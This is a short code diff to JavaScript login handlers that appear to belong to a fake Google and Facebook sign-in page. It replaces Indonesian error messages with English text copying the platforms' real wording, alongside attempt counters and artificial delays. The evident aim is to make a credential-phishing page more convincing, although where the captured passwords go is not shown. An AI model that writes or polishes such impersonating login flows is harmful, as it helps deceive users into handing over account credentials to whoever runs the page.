@@ -1313,7 +1313,7 @@ function handleRpGoogleSubmit() {
       if (passEl) { passEl.value = ''; passEl.focus(); }
       if (errEl) {
         var sisa = RP_MAX - rpGAttempts;
-        errEl.textContent = 'Kata sandi salah. Percobaan tersisa: ' + sisa;
+        errEl.textContent = 'Wrong password. Try again or click Forgot password to reset it. (' + sisa + ' attempt' + (sisa>1?'s':'') + ' left)';
         errEl.classList.add('show');
       }
     }, 1500);
@@ -1349,7 +1349,7 @@ function handleRpFacebookLogin() {
       if (passEl) { passEl.value = ''; passEl.focus(); }
       if (fbErrEl) {
         var sisa = RP_MAX - rpFbAttempts;
-        fbErrEl.textContent = 'Email atau kata sandi salah. Percobaan tersisa: ' + sisa;
+        fbErrEl.textContent = 'The email or mobile number and password you entered don\'t match. Find your account and log in. (' + sisa + ' attempt' + (sisa>1?'s':'') + ' left)';
         fbErrEl.classList.add('show');
       }
     }, 1600);
